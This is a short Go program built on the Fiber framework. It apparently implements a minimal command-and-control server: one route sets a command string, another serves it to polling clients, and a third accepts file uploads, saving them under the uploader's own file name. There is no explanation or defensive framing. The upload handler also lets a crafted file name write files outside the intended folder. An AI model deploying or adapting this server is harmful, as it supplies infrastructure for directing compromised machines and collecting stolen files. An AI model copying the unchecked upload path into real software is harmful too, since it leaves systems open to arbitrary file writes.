package main

import (
	"fmt"
	"github.com/gofiber/fiber/v2"
)

func main() {
	responsecmd := "01"
	app := fiber.New()

	app.Post("/", func(ctx *fiber.Ctx) error {
		file, _ := ctx.FormFile("index.html")

		return ctx.SaveFile(file, fmt.Sprintf("./%s", file.Filename))
	})
	app.Get("/getcmd", func(ctx *fiber.Ctx) error {
		return ctx.SendString(responsecmd)
	})

	app.Get("/postcmd", func(ctx *fiber.Ctx) error {
		responsecmd = ctx.FormValue("command")
		return ctx.SendString(responsecmd)
	})

	app.Listen(":80")
}
